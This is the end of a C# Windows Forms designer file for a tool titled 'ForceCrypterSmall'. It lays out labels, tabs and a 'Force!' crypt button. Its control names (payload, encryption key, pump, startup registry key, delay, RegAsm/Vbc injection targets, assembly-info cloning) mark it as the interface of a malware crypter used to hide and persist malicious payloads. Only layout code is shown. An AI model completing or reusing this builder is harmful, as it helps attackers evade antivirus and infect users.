            this.nsLabel8.Size = new System.Drawing.Size(75, 23);
            this.nsLabel8.TabIndex = 44;
            this.nsLabel8.Text = "nsLabel8";
            this.nsLabel8.Value1 = "FVersion";
            this.nsLabel8.Value2 = ":";
            // 
            // nsLabel7
            // 
            this.nsLabel7.Font = new System.Drawing.Font("Segoe UI", 11.25F, System.Drawing.FontStyle.Bold);
            this.nsLabel7.Location = new System.Drawing.Point(10, 201);
            this.nsLabel7.Name = "nsLabel7";
            this.nsLabel7.Size = new System.Drawing.Size(75, 23);
            this.nsLabel7.TabIndex = 43;
            this.nsLabel7.Text = "nsLabel7";
            this.nsLabel7.Value1 = "Version";
            this.nsLabel7.Value2 = ":";
            // 
            // nsLabel6
            // 
            this.nsLabel6.Font = new System.Drawing.Font("Segoe UI", 11.25F, System.Drawing.FontStyle.Bold);
            this.nsLabel6.Location = new System.Drawing.Point(10, 156);
            this.nsLabel6.Name = "nsLabel6";
            this.nsLabel6.Size = new System.Drawing.Size(75, 23);
            this.nsLabel6.TabIndex = 42;
            this.nsLabel6.Text = "nsLabel6";
            this.nsLabel6.Value1 = "Product";
            this.nsLabel6.Value2 = ":";
            // 
            // nsLabel5
            // 
            this.nsLabel5.Font = new System.Drawing.Font("Segoe UI", 11.25F, System.Drawing.FontStyle.Bold);
            this.nsLabel5.Location = new System.Drawing.Point(10, 111);
            this.nsLabel5.Name = "nsLabel5";
            this.nsLabel5.Size = new System.Drawing.Size(75, 23);
            this.nsLabel5.TabIndex = 41;
            this.nsLabel5.Text = "nsLabel5";
            this.nsLabel5.Value1 = "Company";
            this.nsLabel5.Value2 = ":";
            // 
            // nsLabel4
            // 
            this.nsLabel4.Font = new System.Drawing.Font("Segoe UI", 11.25F, System.Drawing.FontStyle.Bold);
            this.nsLabel4.Location = new System.Drawing.Point(10, 71);
            this.nsLabel4.Name = "nsLabel4";
            this.nsLabel4.Size = new System.Drawing.Size(93, 23);
            this.nsLabel4.TabIndex = 40;
            this.nsLabel4.Text = "nsLabel4";
            this.nsLabel4.Value1 = "Description";
            this.nsLabel4.Value2 = ":";
            // 
            // nsLabel3
            // 
            this.nsLabel3.Font = new System.Drawing.Font("Segoe UI", 11.25F, System.Drawing.FontStyle.Bold);
            this.nsLabel3.Location = new System.Drawing.Point(10, 24);
            this.nsLabel3.Name = "nsLabel3";
            this.nsLabel3.Size = new System.Drawing.Size(75, 23);
            this.nsLabel3.TabIndex = 39;
            this.nsLabel3.Text = "nsLabel3";
            this.nsLabel3.Value1 = "Title";
            this.nsLabel3.Value2 = ":";
            // 
            // CryptTab
            // 
            this.CryptTab.BackColor = System.Drawing.Color.FromArgb(((int)(((byte)(50)))), ((int)(((byte)(50)))), ((int)(((byte)(50)))));
            this.CryptTab.Controls.Add(this.btnCrypt);
            this.CryptTab.Controls.Add(this.richTextBox2);
            this.CryptTab.Location = new System.Drawing.Point(119, 4);
            this.CryptTab.Name = "CryptTab";
            this.CryptTab.Padding = new System.Windows.Forms.Padding(3);
            this.CryptTab.Size = new System.Drawing.Size(396, 546);
            this.CryptTab.TabIndex = 3;
            this.CryptTab.Text = "Crypt";
            // 
            // btnCrypt
            // 
            this.btnCrypt.Location = new System.Drawing.Point(100, 172);
            this.btnCrypt.Name = "btnCrypt";
            this.btnCrypt.Size = new System.Drawing.Size(167, 54);
            this.btnCrypt.TabIndex = 7;
            this.btnCrypt.Text = "Force!";
            this.btnCrypt.Click += new System.EventHandler(this.btnCrypt_Click_1);
            // 
            // richTextBox2
            // 
            this.richTextBox2.Location = new System.Drawing.Point(3, 20);
            this.richTextBox2.Name = "richTextBox2";
            this.richTextBox2.Size = new System.Drawing.Size(387, 134);
            this.richTextBox2.TabIndex = 6;
            this.richTextBox2.Text = resources.GetString("richTextBox2.Text");
            // 
            // Form1
            // 
            this.AutoScaleDimensions = new System.Drawing.SizeF(6F, 13F);
            this.AutoScaleMode = System.Windows.Forms.AutoScaleMode.Font;
            this.ClientSize = new System.Drawing.Size(522, 587);
            this.Controls.Add(this.nsTheme1);
            this.FormBorderStyle = System.Windows.Forms.FormBorderStyle.None;
            this.Name = "Form1";
            this.Text = "ForceCrypterSmall";
            this.nsTheme1.ResumeLayout(false);
            this.AssemblyTab.ResumeLayout(false);
            this.MainTab.ResumeLayout(false);
            this.nsGroupBox7.ResumeLayout(false);
            this.nsGroupBox2.ResumeLayout(false);
            this.nsGroupBox1.ResumeLayout(false);
            this.OptionsTab.ResumeLayout(false);
            this.nsGroupBox5.ResumeLayout(false);
            this.nsGroupBox3.ResumeLayout(false);
            this.nsGroupBox4.ResumeLayout(false);
            this.tabPage3.ResumeLayout(false);
            this.CryptTab.ResumeLayout(false);
            this.ResumeLayout(false);

        }

        #endregion

        private NSTheme nsTheme1;
        private NSTabControl AssemblyTab;
        private System.Windows.Forms.TabPage MainTab;
        private NSGroupBox nsGroupBox2;
        private NSRandomPool nsRandomPool1;
        private NSGroupBox nsGroupBox1;
        private System.Windows.Forms.TabPage tabPage3;
        private System.Windows.Forms.TabPage CryptTab;
        private System.Windows.Forms.RichTextBox richTextBox2;
        private NSButton btnIcon;
        private NSButton btnPayload;
        private NSTextBox txtIcon;
        private NSTextBox txtPayload;
        private System.Windows.Forms.TabPage OptionsTab;
        private NSGroupBox nsGroupBox4;
        private NSLabel nsLabel2;
        private NSTextBox txtTitle;
        private NSLabel nsLabel10;
        private NSLabel nsLabel9;
        private NSLabel nsLabel8;
        private NSLabel nsLabel7;
        private NSLabel nsLabel6;
        private NSLabel nsLabel5;
        private NSLabel nsLabel4;
        private NSLabel nsLabel3;
        private NSTextBox txtEncryptionKey;
        private NSGroupBox nsGroupBox3;
        private NSRadioButton rbRandomBytes;
        private NSLabel nsLabel1;
        private NSTextBox txtPump;
        private NSTextBox txtStartup;
        private NSButton btnClone;
        private NSButton btnRandomize;
        private NSTextBox txtTrademark;
        private NSTextBox txtCopyright;
        private NSTextBox txtFVersion;
        private NSTextBox txtVersion;
        private NSTextBox txtProduct;
        private NSTextBox txtCompany;
        private NSTextBox txtDescription;
        private NSButton btnCrypt;
        private NSGroupBox nsGroupBox5;
        private NSLabel nsLabel11;
        private NSTextBox txtDelay;
        private NSOnOffBox cbPump;
        private NSOnOffBox cbStartup;
        private NSOnOffBox cbDelay;
        private NSControlButton nsControlButton1;
        private NSGroupBox nsGroupBox7;
        private NSRadioButton rbRegAsm;
        private NSRadioButton rbItself;
        private NSRadioButton rbVbc;
        private NSTextBox txtRegKey;
        private NSLabel nsLabel12;
        private NSLabel nsLabel13;
        private NSTextBox txtFName;
    }
}

